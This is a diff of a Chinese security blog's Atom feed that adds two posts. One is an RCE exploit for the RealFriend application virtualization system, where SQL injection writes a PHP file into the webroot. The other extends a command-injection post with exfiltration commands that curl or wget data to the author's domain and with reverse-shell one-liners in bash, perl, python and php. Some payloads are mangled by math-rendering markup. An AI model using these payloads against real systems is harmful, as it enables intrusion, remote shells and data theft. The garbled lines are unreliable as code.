@@ -3,7 +3,24 @@
     <id>http://gyzero.shop</id>
     <title>云逸&#39;bolg</title>
     <link href="http://gyzero.shop" />
-    <updated>2023-11-01T12:51:01.000Z</updated>
+    <updated>2023-11-02T01:11:07.000Z</updated>
+    <entry>
+        <id>http://gyzero.shop/2023/11/02/%E6%BC%8F%E6%B4%9E%E9%9B%86/%E6%BC%8F%E6%B4%9E%E9%9B%86/</id>
+        <title>瑞友应用虚拟化系统rce</title>
+        <link rel="alternate" href="http://gyzero.shop/2023/11/02/%E6%BC%8F%E6%B4%9E%E9%9B%86/%E6%BC%8F%E6%B4%9E%E9%9B%86/"/>
+        <content type="html">&lt;p&gt;瑞友天翼应用虚拟化系统 RCE 漏洞&lt;/p&gt;
+&lt;p&gt;通过 SQL 注入写入后门文件进行代码执行&lt;/p&gt;
+&lt;p&gt;影响版本&lt;br&gt;
+ 5.x&amp;lt;=version&amp;lt;=7.0.2.1&lt;br&gt;
+ 安全版本&lt;br&gt;
+ version&amp;gt;=7.0.3.1&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;/RapAgent.xgi?CMD=GetRegInfo&lt;/strong&gt; 查看版本&lt;/p&gt;
+&lt;p&gt;payload:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h4eC54eHgueHh4Lnh4eC9SYXBBZ2VudC54Z2k/Q01EPS0xJTI3K3VuaW9uK3NlbGVjdCsxJTJDJTI3JTNDJTNGcGhwK3BocGluZm8lMjglMjklM0IlM0YlM0UlMjcraW50bytvdXRmaWxlKyUyMkMlM0ElNUMlNUNQcm9ncmFtJTVDK0ZpbGVzJTVDKyU1QyUyOHg4NiU1QyUyOSU1QyU1Q1JlYWxGcmllbmQlNUMlNUNSYXAlNUMrU2VydmVyJTVDJTVDV2ViUm9vdCU1QyU1Q2FkbWluLnBocCUyMistLSstJmFtcDtjbWQ9VXNlckxvZ2lu&#34;&gt;http://xxx.xxx.xxx.xxx/RapAgent.xgi?CMD=-1’+union+select+1%2C’&amp;lt;%3Fphp+phpinfo()%3B%3F&amp;gt;&#39;+into+outfile+“C%3A\\Program\+Files\+\(x86\)\\RealFriend\\Rap\+Server\\WebRoot\\admin.php”+--+-&amp;amp;cmd=UserLogin&lt;/span&gt;&amp;quot;&lt;/p&gt;
+&lt;p&gt;写 phpinfo 创建 admin.php&lt;/p&gt;
+&lt;p&gt;访问 admin.php&lt;/p&gt;
+</content>
+        <updated>2023-11-02T01:11:07.000Z</updated>
+    </entry>
     <entry>
         <id>http://gyzero.shop/2023/11/01/%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
         <title>命令执行漏洞</title>
@@ -74,6 +91,28 @@ linux 操作系统&lt;br&gt;
 &lt;p&gt;linux 使用 seelp 函数&lt;/p&gt;
 &lt;p&gt;win 使用比较耗时间的 ping -n 5&lt;/p&gt;
 &lt;h4 id=&#34;http外带&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http外带&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;HTTP 外带&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1odHRwZ3l6ZXJvLXBmMnB5cG8zOWJ2emVlOXFudXhvOWRlejliaW81ZG53NWIuc2hvcA==&#34;&gt;开一个 http 服务自己的域名 gyzero.shop&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;linux 管道利用 wget,curl 进行数据外带会在服务器日志有记录如下&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ping -c 3curl gyzero.shop/ls&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ping -c 3wget gyzero.shop/$(id|base64)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;windows&lt;/p&gt;
+&lt;p&gt;powershell 进行外带数据&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;for /F %x in (echo &#39;zzzz&#39;) do powershell $b =&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;[system.convert]::tobase64string(system.text.encoding)::utf-8.getbytes(‘%x’)):$b=new=object&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;system.net.webclient;$b.downloadstring(&#39;http://gyzero.shop/httplig/&#39;+$a);&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;反弹 shell&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;远程服务器 nc 监听&lt;br&gt;
+ nc -vlnp 8080&lt;/p&gt;
+&lt;p&gt;受害者反弹 shell&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/li&gt;
+&lt;li&gt;perl -e &#39;use&lt;/li&gt;
+&lt;li&gt;Socket;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mn&gt;10.0.0.1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;i=&amp;quot;10.0.0.1&amp;quot;;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6595em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8889em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;10.0.0.1&amp;quot;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect( S,sockaddr_in(&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;p,inet_aton(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.1667em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1514em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;a&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;i)))){open(STDIN,“&amp;gt;&amp;amp;S”);open(STDOUT,“&amp;gt;&amp;amp;S”);open(STDERR,“&amp;gt;&amp;amp;S”);ex ec(“/bin/sh -i”);};’&lt;/li&gt;
+&lt;li&gt;python -c &#39;import&lt;/li&gt;
+&lt;li&gt;socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.0.0.1 &amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);&lt;/li&gt;
+&lt;li&gt;os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’&lt;/li&gt;
+&lt;li&gt;php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3”);’&lt;/li&gt;
+&lt;/ul&gt;
 </content>
         <updated>2023-11-01T12:51:01.000Z</updated>
     </entry>
